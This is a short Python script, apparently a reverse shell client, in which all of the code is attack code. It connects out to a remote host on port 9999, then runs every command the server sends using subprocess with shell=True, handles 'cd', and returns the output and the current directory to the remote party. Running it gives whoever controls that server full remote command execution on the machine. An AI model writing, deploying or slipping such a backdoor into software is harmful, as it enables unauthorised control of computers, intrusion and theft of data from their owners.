import os
import socket
import subprocess

s=socket.socket(); #create a socketobject
port=9999; #port number
host='code'; #ip address of the system
s.connect((host,port)); #connect the address to one end of the socket

while True:
    data=s.recv(1024); #recieve command from the server
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8')); #change the directory of the client
    if len(data)>0:
        cmd=subprocess.Popen(data[:].decode('utf-8'),shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE,stdin=subprocess.PIPE); #open the client cmd and perform the cmd command
        output_byte=cmd.stderr.read()+ cmd.stdout.read(); #read output and error
        output_string=str(output_byte,'utf-8'); #decode in utf-8
        wd=os.getcwd()+'>'; #get current working directory
        s.send(str.encode(output_string+wd)); # encode the string
        print(output_string);
